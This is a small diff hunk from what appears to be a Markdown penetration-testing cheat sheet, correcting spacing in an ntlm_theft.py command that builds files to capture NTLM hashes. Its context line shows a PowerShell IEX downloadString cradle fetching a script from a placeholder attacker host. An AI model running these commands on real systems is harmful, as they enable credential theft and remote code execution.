@@ -305,7 +305,7 @@ C:\> powershell "IEX(New-Object Net.Webclient).downloadString('http://<LHOST>:<L
 ## ntml_theft
 
 ```c
-$ python3 ntlm_theft.py --generate all --server <RHOST>  --filename <FOLDER>
+$ python3 ntlm_theft.py --generate all --server <RHOST> --filename <FOLDER>
 ```
 
 ## PDF
